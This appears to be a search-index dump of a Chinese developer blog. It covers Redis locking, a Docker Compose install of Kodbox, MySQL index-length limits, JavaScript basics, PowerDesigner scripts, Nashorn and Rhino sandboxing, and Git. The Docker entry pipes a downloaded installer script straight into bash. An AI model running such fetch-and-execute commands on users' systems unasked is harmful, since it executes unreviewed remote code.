StandardEvaluationContext context = new StandardEvaluationContext(methodParam); context.addPropertyAccessor(new MapAccessor()); String key = SpELUtils.parseExpression(annotation.key()).getValue(context, String.class); //去获取redis锁，锁持有时间为注解属性forbidSeconds boolean lock = RedisUtil.tryLock(prefix + key, 0, annotation.forbidSeconds() * 1000L); if (!lock) { //如果获取锁失败 // 拿到注解属性提示语，抛出异常 String message = StringUtils.isBlank(annotation.message()) ? DEFAULT_BLOCKING_MESSAGE : annotation.message(); throw new BizException(2001, message); } } catch (BizExceptio","date":"2024-01-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/:0:3","tags":[],"title":"如何优雅地避免重复提交","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/"},{"categories":["Java后端"],"content":"最后附上切面里使用的一个工具类RedisUtil的方法 /** * 这里采用的Redssion进行的加锁， * 大家如果对redission底层不熟悉的可以看我的另一篇文章 * https://juejin.cn/post/7254444906210000955 * 里面具体讲解了Redission分布式锁的底层原理且分析了看门狗机制 */ public static boolean tryLock(String redisKey, long waitMill, long leaseMill) { RLock rLock = redissonClient.getLock(redisKey); boolean locked = false; try { locked = rLock.tryLock(waitMill, leaseMill, TimeUnit.MILLISECONDS); } catch (Exception ex) { LOGGER.warn(\"redisson tryLock failed redisKey:{}, e\", redisKey, ex); } return locked; } ","date":"2024-01-03","objectID":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/:0:4","tags":[],"title":"如何优雅地避免重复提交","uri":"/posts/%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%9C%B0%E9%81%BF%E5%85%8D%E9%87%8D%E5%A4%8D%E6%8F%90%E4%BA%A4/"},{"categories":["运维"],"content":"官方文档：Docker环境可道云网盘的安装示例 | Kodcloud Documentation 安装Docker环境 安装并启动docker服务, 新版本docker会自动安装docker-compose-plugin curl -fsSL https://get.docker.com | bash -s docker systemctl enable docker \u0026\u0026 systemctl start docker docker compose 用法, 在通过docker compose up启动后, 可以使用docker compose ls查看配置文件位置 若docker compose命令不存在，可手动安装二进制文件docker-compose并在后续命令中替换。 curl -SL https://github.com/docker/compose/releases/download/v2.23.3/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose chmod +x /usr/local/bin/docker-compose http方式快速启动 首先创建一个目录作为项目目录，后面所有命令都在这个目录下执行 mkdir /kodbox \u0026\u0026 cd /kodbox 创建文件来设置数据库环境变量vim db.env MYSQL_PASSWORD= MYSQL_DATABASE=kodbox MYSQL_USER=kodbox 创建docker-compose.yml 文件，在其中配置映射端口、持久化目录 version: '3.5' services: db: image: mariadb:10.6 restart: always command: --transaction-isolation=READ-COMMITTED --log-bin=binlog --binlog-format=ROW volumes: - \"./db:/var/lib/mysql\" #./db是数据库持久化目录，可以修改 # - \"./etc/mysql/conf.d:/etc/mysql/conf.d\" #增加自定义mysql配置 environment: - MYSQL_ROOT_PASSWORD= - MARIADB_AUTO_UPGRADE=1 - MARIADB_DISABLE_UPGRADE_BACKUP=1 env_file: - db.env app: image: kodcloud/kodbox restart: always ports: - 80:80 #左边80是使用端口，可以修改 volumes: - \"./site:/var/www/html\" #./site是站点目录位置，可以修改 environment: - MYSQL_HOST=db - REDIS_HOST=redis env_file: - db.env depends_on: - db - redis redis: image: redis:alpine restart: always 增加自定义mysql配置： mkdir -p ./etc/mysql/conf.d \u0026\u0026 vim ./etc/mysql/conf.d/custom.cnf 进入项目目录，执行docker compose up -d启动命令，会自动拉取容器并运行 列出docker容器，可以看到3个容器正在运行 如果需要停止服务 docker compose down 安装要点 1、MYSQL_ROOT_PASSWORD需要自己填 2、安装过程中 app 容器第一次安装事件比较长，不要中途停止容器 3、MYSQL_PASSWORD这个是环境变量，不知道是不是必填，自己测试一下 ","date":"2023-12-29","objectID":"/posts/docker%E5%AE%89%E8%A3%85kodbox%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8/:0:0","tags":["docker","kodbox","文件管理"],"title":"Docker安装Kodbox快速启动","uri":"/posts/docker%E5%AE%89%E8%A3%85kodbox%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8/"},{"categories":["数据库"],"content":" Specified key was too long; max key length is 3072 bytes show variables like 'innodb_page_size'; 16384 = 16KB * 1024 果断翻译了一下mysql8的官方文档，得出结论： 需要修改长度的字段做了索引； innodb引擎的每个索引列长度限制为767字节（bytes），所有组成索引列的长度和不能大于3072字节。为什么限制为3072 ？ 这个和InnoDB的页大小有关。 我们知道InnoDB一个page的默认大小是16k。由于是B+树组织，要求叶子节点上一个page至少要包含两条记录所以一个记录最多不能超过8k。又由于InnoDB的聚簇索引结构，一个二级索引要包含主键索引，因此每个单个索引不能超过 4 k（极端情况，聚集索引和某个二级索引都达到这个限制）。由于需要预留和辅助空间，扣掉后不能超过 3500 ，取个“整数”就是(1024*3)。由此推算将页大小改为8K，4K的时候索引长度限制也应该相应减小。 问题所在的表的字符集是 utf8mb4 时，一个字符将占用 4 个字节。这意味着索引前缀最大长度为 3072 字节时，只能容纳 3072 / 4 = 768 个字符。因此只要将上面建表语句索引字段的前缀长度设为768或者修改索引字段，让其小于3072字节。 索引前缀长度还和 InnoDB 的 page size 有关。“innodb_page_size”选项默认是 16KB 的时候，最长索引前缀长度是 3072 字节，如果是 8KB 的时候，最长索引前缀长度是 1536 字节；4KB 的时候，最长索引前缀长度是 768 字节。 总结：读取数据的整个流程中，最浪费时间的是磁盘寻道，查找数据所属扇区位置的过程（机械运动）。又因为内存最小的存储单位是页，这样最快的存储方式，1个内存页的数据，正好在1个扇区内，一次性查询完成。所以限制了3072字节为1个内存页。 综上可知： 当Mysql数据库引擎为innodb时，page_size大小为16KB（16384）、utf8mb4字符集时，建立索引的字段长度不能超过 768个字符，超过就报错 如何计算索引长度 所有的索引字段，如果没有设置 Not Null，则需要加一个字节(这也是我们为什么建议建表时不要有 Null 字段的原因之一)。 对于定长字段，int 类型占四个字节、date 占三个字节、char(n) 占 N 个字符。 对于变成字段 varchar(n)，则是 N 个字符 + 两个字节。 不同的字符集，一个字符占用的字节数不同。latin1编码的，一个字符占用一个字节，gbk编码的，一个字符占用两个字节，utf8编码的，一个字符占用三个字节。 索引长度 char()、varchar() 索引长度的计算公式： Character Set：utf8mb4=4,utf8=3,gbk=2,latin1=1) * 列长度 + 1(允许 Null) + 2(变长列) 基于以上原则，我们建张表来验证下： CREATE TABLE `tb_item` ( `id` bigint NOT NULL COMMENT '书籍id，同时也是书籍编号', `title` varchar(100) NOT NULL COMMENT '书籍名称', `sell_point` varchar(500) DEFAULT NULL COMMENT '书籍卖点', `price` bigint NOT NULL COMMENT '书籍价格，单位为：分', `num` int NOT NULL COMMENT '库存数量', `barcode` varchar(30) DEFAULT NULL COMMENT '书籍条形码', `image` varchar(500) DEFAULT NULL COMMENT '书籍图片', `cid` bigint NOT NULL COMMENT '所属类目，叶子类目', `status` tinyint NOT NULL DEFAULT '1' COMMENT '书籍状态，1-正常，2-下架，3-删除', `created` datetime NOT NULL COMMENT '创建时间', `updated` datetime NOT NULL COMMENT '更新时间', `upload_id` bigint DEFAULT NULL, PRIMARY KEY (`id`), KEY `cid` (`cid`), KEY `status` (`status`), KEY `updated` (`updated`), KEY `tb_item_title_price_","date":"2023-12-26","objectID":"/posts/specified-key-was-too-long-max-key-length-is-3072-bytes/:0:0","tags":[],"title":"Specified key was too long; max key length is 3072 bytes","uri":"/posts/specified-key-was-too-long-max-key-length-is-3072-bytes/"},{"categories":["前端"],"content":"快速入门 数据类型与变量 实际上，JavaScript允许对任意数据类型做比较： false == 0; // true false === 0; // false 要特别注意相等运算符==。JavaScript在设计时，有两种比较运算符： 第一种是 == 比较，它会自动转换数据类型再比较，很多时候，会得到非常诡异的结果； 第二种是 === 比较，它不会自动转换数据类型，如果数据类型不一致，返回false，如果一致，再比较。 由于JavaScript这个设计缺陷，不要使用==比较，始终坚持使用===比较。 另一个例外是NaN这个特殊的Number与所有其他值都不相等，包括它自己： NaN === NaN; // false 唯一能判断NaN的方法是通过isNaN()函数： isNaN(NaN); // true 最后要注意浮点数的相等比较： 1 / 3 === (1 - 2 / 3); // false 这不是JavaScript的设计缺陷。浮点数在运算过程中会产生误差，因为计算机无法精确表示无限循环小数。要比较两个浮点数是否相等，只能计算它们之差的绝对值，看是否小于某个阈值： Math.abs(1 / 3 - (1 - 2 / 3)) \u003c 0.0000001; // true BigInt 要精确表示比253还大的整数，可以使用内置的BigInt类型，它的表示方法是在整数后加一个n，例如9223372036854775808n，也可以使用BigInt()把Number和字符串转换成BigInt： var bi1 = 9223372036854775807n; var bi2 = BigInt(12345); var bi3 = BigInt(\"0x7fffffffffffffff\"); console.log(bi1 === bi2); // false console.log(bi1 === bi3); // true console.log(bi1 + bi2); false true 9223372036854788152 null和undefined null表示一个“空”的值，它和0以及空字符串''不同，0是一个数值，''表示长度为0的字符串，而null表示“空”。 在其他语言中，也有类似JavaScript的null的表示，例如Java也用null，Swift用nil，Python用None表示。但是，在JavaScript中，还有一个和null类似的undefined，它表示“未定义”。 JavaScript的设计者希望用null表示一个空的值，而undefined表示值未定义。事实证明，这并没有什么卵用，区分两者的意义不大。大多数情况下，我们都应该用null。undefined仅仅在判断函数参数是否传递的情况下有用。 true or false JavaScript把null、undefined、0、NaN和空字符串''视为false，其他值一概视为true for(var i in arr) for(var i of arr) var inArray = ['a','dfg','sdvfd','ryt','234']; for(var i in inArray){ console.log(i); console.log(inArray[i]); } 0 a 1 dfg 2 sdvfd 3 ryt 4 234 var inArray = ['a','dfg','sdvfd','ryt','234']; for(var i of inArray){ console.log(i); } a dfg sdvfd ryt 234 函数 函数的定义 function abs(x) { if (x \u003e= 0) { return x; } else { return -x; } } 由于JavaScript的函数也是一个对象，上述定义的abs()函数实际上是一个函数对象，而函数名abs可以视为指向该函数的变量。 var abs = function (x) { if (x \u003e= 0) { return x; } else { return -x; } }; 在这种方式下，function (x) { ... }是一个匿名函数，它没有函数名。但是，这个匿名函数赋值给了变量abs，所以，通过变量abs就可以调用该函数。 上述两种定义完全等价，注意第二种方式按照完整语法需要在函数体末尾加一个;，表示赋值语句结束。 function foo(x) { console.log('x = ' + x); // 10 for (var i=0; i\u003carguments.length; i++) { console.log('arg ' ","date":"2023-12-25","objectID":"/posts/javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/:0:1","tags":[],"title":"JavaScript基础语法","uri":"/posts/javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"},{"categories":["运维"],"content":"基础操作设置 修改name,code同步修改，操作不便 版本在16.6之下 工具栏 Tools -\u003e 常规选项 general Options -\u003e Dialog 下 Name to Code mirroring 取消勾选 版本是16.6以及之上 工具栏 Tools -\u003e 常规选项 general Options -\u003e Respository 下 Display 取消 Name to Code mirroring 勾选 工具栏 Tools -\u003e Modeal Options -\u003e Naming Convention -\u003e Synchronize code ","date":"2023-12-21","objectID":"/posts/sql%E7%94%9F%E6%88%90pdm%E6%96%87%E4%BB%B6/:0:1","tags":["PDM"],"title":"SQL生成PDM文件","uri":"/posts/sql%E7%94%9F%E6%88%90pdm%E6%96%87%E4%BB%B6/"},{"categories":["运维"],"content":"SQL逆向生成PDM 第一步：File \u003e Reverse Engineer \u003e Database 第二步：设置DBMS参数 第三步：选择sql文件 ","date":"2023-12-21","objectID":"/posts/sql%E7%94%9F%E6%88%90pdm%E6%96%87%E4%BB%B6/:0:2","tags":["PDM"],"title":"SQL生成PDM文件","uri":"/posts/sql%E7%94%9F%E6%88%90pdm%E6%96%87%E4%BB%B6/"},{"categories":["运维"],"content":"生成的PDM将coments同步至name字段 Open PDM–Tools–Execute Commands–Run Script 脚本语法参考 Microsoft VBScript 脚本语法 脚本1 Option Explicit ValidationMode = True InteractiveMode = im_Batch Dim mdl Set mdl = ActiveModel If (mdl Is Nothing) Then MsgBox \"There is no current Model\" ElseIf Not mdl.IsKindOf(PdPDM.cls_Model) Then MsgBox \"The current model is not an Physical Data model.\" Else ProcessFolder mdl End If Private sub ProcessFolder(folder) Dim Tab for each Tab in folder.tables if not tab.isShortcut then tab.name=tab.comment Dim col for each col in tab.columns col.name=col.comment next end if next end sub 脚本2 '------------------------------------------------------------ ' '脚本功能： ' PowerDesigner中****完成后，将数据库中comment脚本 ' 赋值到PDM的name '执行方法： ' Open PDM--Tools--Execute Commands--Run Script ' '------------------------------------------------------------ Option Explicit ValidationMode = True InteractiveMode = im_Batch Dim mdl 'the current model 'get the current active model Set mdl = ActiveModel If (mdl Is Nothing) Then MsgBox \"There is no current Model\" ElseIf Not mdl.IsKindOf(PdPDM.cls_Model) Then MsgBox \"The current model is not an Physical Data model.\" Else ProcessFolder mdl End If '------------------------------------------------------------ 'This routine copy name into code for each table, each column 'and each view of the current folder '------------------------------------------------------------ Private sub ProcessFolder(folder) Dim Tab 'running table for each Tab in folder.tables if not tab.isShortcut then if len(tab.comment) \u003c\u003e 0 then tab.name = tab.comment end if On Error Resume Next Dim col 'running column Dim b for each col in tab.columns b = Split(col.comment,\";\") if len(b(0)) \u003c\u003e0 then col.name = b(0) end if if ubound(b) \u003e0 then col.comment = b(1) else col.comment = \"\" end if On Error Resume Next next end if next end sub '------------------------------------------------------------ kingdee脚本 '------------------------------------------------------------ ' '脚本功能： ' PowerDesigner中","date":"2023-12-21","objectID":"/posts/sql%E7%94%9F%E6%88%90pdm%E6%96%87%E4%BB%B6/:0:3","tags":["PDM"],"title":"SQL生成PDM文件","uri":"/posts/sql%E7%94%9F%E6%88%90pdm%E6%96%87%E4%BB%B6/"},{"categories":["Java后端"],"content":"Nashorn探索背景 ​ 通过合理的设计，将应用程序中所有动态变量都配置化，可以最大程度上让程序变得灵活。而灵活的配置，既可以减少开发成本，又能提高交付的效率。 提到业务规则的可配置化技术，自然是首推规则引擎了，像drools，easy rule 都是比较优秀的开源规则引擎，他们可以通过特定的语法，将if esle等判断逻辑从代码中独立出来，甚至可以热更新规则，非常的成熟好用。 ​ 只不过，有些时候，我们可能并不需要规则引擎的所有完整的功能，也不想引入一堆依赖的包，我们只是想要做一些简单的逻辑配置工作，这个时候，Nashorn脚本引擎就可以纳入考虑的范围了。 ","date":"2023-11-23","objectID":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:1","tags":["Nashorn脚本"],"title":"Nashorn脚本引擎框架","uri":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Java后端"],"content":"Nashorn简介 ​ Nashorn 最初是在 JDK 8 中引入的，用于取代 Rhino 脚本引擎。当其发布时，Nashorn 是 ECMAScript-262 5.1 的完整实现，增强了 Java 和 JavaScript 的兼容性。 ​ 借助 Nashorn，开发人员可以从 JavaScript 调用 Java 代码，也可以从 Java 代码调用 JavaScript 函数。Nashorn 可以作为 Java 应用程序的嵌入式解释器，提供使用 Nashorn 命令行工具 jjs 从命令行运行 JavaScript 的能力。当在 Java 中对 JavaScript 代码求值时，Nashorn 实现了javax.script API。 ","date":"2023-11-23","objectID":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:2","tags":["Nashorn脚本"],"title":"Nashorn脚本引擎框架","uri":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Java后端"],"content":"Nashorn语法一览： ​ Nashorn使用的都是原生的java和js语法，并没有什么上手门槛，需要注意的是，js语法并不支持ES6。下面我们简单的看一下如何使用它。 hello js in JVM ​ Nashorn是JDK中自带的包，并不需要引入额外的依赖，只不过要jdk1.8的版本才支持。它通过在JVM上以原生方式运行动态JavaScript代码的方式来扩展java的功能。 首先，我们来感受一下在jvm运行js的骚操作： ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName(\"nashorn\"); scriptEngine.eval(\"print('hello js in jvm')\"); ​ 这里可以直接写js代码，也可以读取特定的文件中的js代码，也就是说，这里的js脚本，我们是可以在前端灵活配置的，这样就达到了我们随心所欲配置规则的目的了。 在JVM在中调用js函数 Nashorn支持调用js的函数，我们先在脚本中定义函数，再到JVM var sayHi = function(name) { print('hello js,my name is ' + name); return \"result from js\"; }; 调用方法： ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"nashorn\"); engine.eval(new FileReader(\"script.js\")); Invocable invocable = (Invocable) engine; Object result = invocable.invokeFunction(\"sayHi\", \"JAVA\"); System.out.println(result); //此处为调用控制台返回值： //hello js,my name is JAVA //result from js 在js中调用java 反过来，也可以在js中调用java的方法也很简单： 先定义静态方法 static String sayHiByJava(String name) { System.out.format(\"hello java,my name is %s\", name); return \"result from java\"; } 注意，调用时，需要先使用Java.type引入java class，类似于java中import var MyJavaClass = Java.type('com.lx.soil.demos.leetcode.Solution'); var result = MyJavaClass.sayHiByJava('js'); print(result); //此处为调用控制台返回值： //hello java,my name is js //result from java ","date":"2023-11-23","objectID":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:3","tags":["Nashorn脚本"],"title":"Nashorn脚本引擎框架","uri":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Java后端"],"content":"使用Nashorn的几种安全机制： 既然是可以支持动态传入脚本来运行js代码，而且可以调用java中的类，那么安全问题就是我们所必须要注意的了，在安心使用Nashorn前，下面两个点是必须要解决的： 首先是防止任意代码执行的漏洞 防止代码有逻辑错误死循环导致占用大量资源 好在，现在有两个比较靠谱的方案来解决这些问题： 使用ClassFilter限制js引擎可以访问的类 1.在jdk1.8中引入了ClassFilter来限制可以访问的类，只要限制了可以访问的类，那么代码任意执行的漏洞就可以解决了，但是这个还不完美，因为还有第二个问题没解决。 import javax.script.ScriptEngine; import jdk.nashorn.api.scripting.ClassFilter; import jdk.nashorn.api.scripting.NashornScriptEngineFactory; public class MyClassFilterTest { class MyCF implements ClassFilter { @Override public boolean exposeToScripts(String s) { if (s.compareTo(\"java.io.File\") == 0) return false; return true; } } public void testClassFilter() { final String script = \"print(java.lang.System.getProperty(\\\"java.home\\\"));\" + \"print(\\\"Create file variable\\\");\" + \"var File = Java.type(\\\"java.io.File\\\");\"; NashornScriptEngineFactory factory = new NashornScriptEngineFactory(); ScriptEngine engine = factory.getScriptEngine( new MyClassFilterTest.MyCF()); try { engine.eval(script); } catch (Exception e) { System.out.println(\"Exception caught: \" + e.toString()); } } public static void main(String[] args) { MyClassFilterTest myApp = new MyClassFilterTest(); myApp.testClassFilter(); } } 执行完则会报错： C:\\Java\\jre8 Create file variable Exception caught: java.lang.RuntimeException: java.lang.ClassNotFoundException: java.io.File Nashorn沙箱 事实上，Nashorn本身就考虑了安全问题，实现了一套沙箱机制(SandBox),用法如下： NashornSandbox sandbox = NashornSandboxes.create(); sandbox.allow(File.class); sandbox.eval(\"var File = Java.type('java.io.File'); File;\") 限制nashorn引擎的资源使用也有考虑： NashornSandbox sandbox = NashornSandboxes.create(); sandbox.setMaxCPUTime(100); sandbox.setMaxMemory(50*1024); sandbox.allowNoBraces(false); sandbox.setMaxPreparedStatements(30); // because preparing scripts for execution is expensive sandbox.setExecutor(Executors.newSingleThreadExecutor()); sandbox.eval(\"var o={}, i=0; while (true) {o[i++]='abc';};\"); ","date":"2023-11-23","objectID":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:4","tags":["Nashorn脚本"],"title":"Nashorn脚本引擎框架","uri":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Java后端"],"content":"Nashorn沙箱的实现原理浅析： java应用程序本身就是自带沙箱的，只不过一般都没有被启用，要启用沙箱，在启动的命令行要加如下参数： java -Djava.security.manager \u003cother args\u003e 沙箱启动后，安全管理器会使用两个默认的策略文件来确定沙箱启动参数。当然也可以通过命令指定： java -Djava.security.policy=\u003cURL\u003e 如果要求启动时只遵循一个策略文件，那么启动参数要加个等号，如下： java -Djava.security.policy==\u003cURL\u003e 关于java的安全沙箱，这里有一篇比较完整的介绍文章，有兴趣的同学可以看看。 java安全沙箱 写在最后 本来Nashorn是有计划支持ES6的，但是由于对ES6的支持太过困难，导致oracle放弃了这一想法（手动表示遗憾。。。），甚至打算弃用Nashorn，所以最后在我的项目中并没有使用Nashorn引擎，而是选用了抽象的方式去迂回实现我所需要的功能，但是，Nashorn确实给我提供了一种思路，一种能让我在终极可配置化的道路上走的更远的思路，一种能让我离\"write once， run forevre\"的终极目标更近一小步的思路。 ","date":"2023-11-23","objectID":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:5","tags":["Nashorn脚本"],"title":"Nashorn脚本引擎框架","uri":"/posts/nashorn%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Java后端"],"content":"一:Rhino简介 Rhino是一个完全以Java编写的JavaScript引擎，目前由Mozilla基金会所管理。Rhino项目开始于1997年，当时，Netscape计划开发Java版本的Netscape Navigator，虽然该计划最终被放弃，但是Rhino引擎被遗留了下来。1998年4月，Mozilla基金会宣布开放源代码.引擎的命名源自于欧莱礼所出版的《JavaScript: The Definitive Guide》一书的封面动物.Rhino作为JDK脚本引擎对JavaScript支持部分包含到甲骨文JDK 1.6中，但将被Nashorn继承取代包含到OpenJDK 1.8中. ","date":"2023-11-02","objectID":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:1","tags":["Rhino脚本"],"title":"Rhino脚本引擎框架","uri":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Java后端"],"content":"二:Rhino资料 下载地址: https://developer.mozilla.org/en-US/docs/Mozilla/Projects/Rhino/Download_Rhino 官网文档资料: https://developer.mozilla.org/en-US/docs/Mozilla/Projects/Rhino http://mozilla.github.io/rhino/javadoc/index.html 版本选用的版本: rhino1.7.6 JavaScript 引擎概念: “JavaScript 引擎”通常被称作一种 虚拟机。“虚拟机”是指软件驱动的给定的计算机系统的模拟器。有很多类型的虚拟机，它们根据自己在多大程度上精确地模拟或代替真实的物理机器来分类。例如，“系统虚拟机”提供了一个可以运行操作系统的完整仿真平台。Mac 用户很熟悉的 Parallels 就是一个允许你在 Mac 上运行 Windows系统虚拟机。另一方面，“进程虚拟机”不具备全部的功能，能运行一个程序或者进程。Wine 是一个允许你在 Linux 机器上运行 Windows 应用的进程虚拟机，但是并不在 Linux 中提供完整的 Windows 操作系统。JavaScript 虚拟机是一种进程虚拟机，专门设计来解释和执行的 JavaScript 代码。 ","date":"2023-11-02","objectID":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:2","tags":["Rhino脚本"],"title":"Rhino脚本引擎框架","uri":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Java后端"],"content":"三:主要解决的问题 本文档主要介绍的Rhino的基本使,重点在介绍JavasScrip在Java中的嵌入开发时Java和JavaScript之间的相互调用. ","date":"2023-11-02","objectID":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:3","tags":["Rhino脚本"],"title":"Rhino脚本引擎框架","uri":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Java后端"],"content":"四:Rhino的基本使用 1.引入 Rhino JavaScript 工具包 由于Rhino作为JDK脚本引擎对JavaScript支持部分包含到甲骨文JDK 1.6中,所以在JDK1.6及以上版本不需要单独的引入Jar包. JDK1.6以下版本需要引入以下jar包: js.jar 2.构造 JavaScript 的运行环境 Context对象中储存了脚本执行的全局环境信息. Context cx = Context.enter() 3.初始化标准对象 scope 变量类似于构造了一个全局对象，而在整个运行过程中 JavaScript 的变量都会作为该对象的一部分. Scriptable scope = cx.initStandardObjects(); 4.执行 JavaScript 脚本 执行脚本字符串 string，当脚本中需要使用其它变量时，会在作用域 scope 中寻找所需要的变量，如果发生异常的话则会报告 error 错误信息和所在的行号 num，正确执行结束后会返回一个 Object 对象的运行结果。如果脚本字符串中没有需要执行的表达式则会返回undefined. Object result = cx.evaluateString(scope, string, error, num, null); 静态方法Context.toString(Object result)返回该对象在JavaScript中的值. public final Object evaluateString(Scriptable scope, String source,String sourceName, int lineno, Object securityDomain) 参数解释: Scope : 运行的作用域,运行js时会在作用域 scope 中寻找所需要的变量. Source: 待运行的JS脚本字符串. SourceName: 定义源码的名称,出错的时候方便定位,可以为null. Lineno: 发生错误时显示的行号. securityDomain: 一个指定安全性的任意对象,如果不关心线程安全是,可以为null值. 5.结束上下文 结束上下文是每次使用 Rhino 结束后必须要做的工作，它将移除上下文和当前的线程并做垃圾回收。在每次进入上下文后都应该调用静态方法Context.exit()退出，因为在使用过程中可能会产生异常，所以通常在调用 Context.enter() 进入上下文之后，将退出操作放入对应的 finally 块中. Context.exit(); 6.在Java代码中加载外部JS文件 在Java代码中加载外部JS文件,有两种方式,Context实例提供两个方法: 方式一: public static void testLoadJSFile() { Context context = Context.enter(); LineNumberReader reader = null; try { Scriptable scope = context.initStandardObjects(); String filename = System.getProperty(\"user.dir\") + File.separator + \"testLoadJs.js\"; reader = new LineNumberReader(new FileReader(filename)); String temp = null; StringBuffer sb = new StringBuffer(); while ((temp = reader.readLine()) != null) { sb.append(temp).append(\"\\n\"); } context.evaluateString(scope, sb.toString(), null, 1, null); Object result = context.evaluateString(scope, \"countNumber(10010);\", \"mysource\", 1, null); System.out.println(Context.toString(result)); } catch (Exception e) { e.printStackTrace(); } finally { if (reader != null) { try { reader.close(); } catch (IOException e) { e.printStackTrace(); } } Context.exit(); } } 方式二: public static void testL","date":"2023-11-02","objectID":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:4","tags":["Rhino脚本"],"title":"Rhino脚本引擎框架","uri":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Java后端"],"content":"五:Java 和 JavaScript 对象相互调用 1.在JavaScrip中调用Java对象 A.在JS调用Java对象(在JS代码中声明Java对象) public static void testCallJavaInScript() { Context context = Context.enter(); Scriptable scope = context.initStandardObjects(); try { context.evaluateString(scope, \"java.lang.System.out.println('你好Yves!');\", null, 1, null); } catch (Exception e) { e.printStackTrace(); } finally { Context.exit(); } } B.在JS调用Java对象(在java代码中声明Java对象) public static void testCallJavaInScript2() { Context context = Context.enter(); Scriptable scope = context.initStandardObjects(); // 1.将java对象放置JS的作用域中 Student students = new Student(); students.setAge(23); students.setName(\"Yves\"); Object jsObj = Context.javaToJS(students, scope); ScriptableObject.putProperty(scope, \"student\", jsObj); // 2.在JS中调用放置在JS作用域中的Java对象. try { Object result1 = context.evaluateString(scope, \"student.showInfo()\", null, 1, null); Object result2 = context.evaluateString(scope, \"student.showInfo('study')\", null, 1, null); System.out.println(Context.toString(result1)); System.out.println(Context.toString(result2)); } catch (Exception e) { e.printStackTrace(); } finally { Context.exit(); } } 2.在Java中调用JavaScript脚本 在 Java 中若要取得 JavaScript 脚本的运行结果非常的简单. evaluateReader(Scriptable scope, Reader in,String sourceName, int lineno,Object securityDomain); evaluateString(Scriptable scope, String source,String sourceName, int lineno,Object securityDomain); 这两个方法返回的结果都是JavaScript 脚本运行后的结果,如果没有运行的脚本,则返回的是undefined; 有时候在项目开发中我们或许常常会希望获得一些额外的信息，比如运行过程中的一些临时信息，无法作为最终结果返回时下面就是获取运行时的一些临时信息的方式: A.在 Java 中调用 JavaScript 脚本中的变量 public static void testCallScriptInJava() { Context context = Context.enter(); try { Scriptable scope = context.initStandardObjects(); String jsStr = \"var name = 'Yves';\"; context.evaluateString(scope, jsStr, null, 1, null); Object jsObject = scope.get(\"name\", scope); if (jsObject == Scriptable.NOT_FOUND) { System.out.println(\"name is not defined.\"); } else { System.out.println(\"name is \" + Context.toString(jsObject)); } } catch (Exception","date":"2023-11-02","objectID":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/:0:5","tags":["Rhino脚本"],"title":"Rhino脚本引擎框架","uri":"/posts/rhino%E8%84%9A%E6%9C%AC%E5%BC%95%E6%93%8E%E6%A1%86%E6%9E%B6/"},{"categories":["Git"],"content":"使用 Git 作为代码版本管理，早已是现在开发工程师必备的技能。可大多数工程师还是只会最基本的保存、拉取、推送，遇到一些commit管理的问题就束手无策，或者用一些不优雅的方式解决。 本文分享我在开发工作中实践过的实用命令。这些都能够大大提高工作效率，还能解决不少疑难场景。下面会介绍命令，列出应用场景，手摸手教学使用，让同学们看完即学会。 ","date":"2023-10-27","objectID":"/posts/git%E8%BF%9B%E9%98%B6/:0:0","tags":["Git进阶"],"title":"Git进阶","uri":"/posts/git%E8%BF%9B%E9%98%B6/"},{"categories":["Git"],"content":"stash 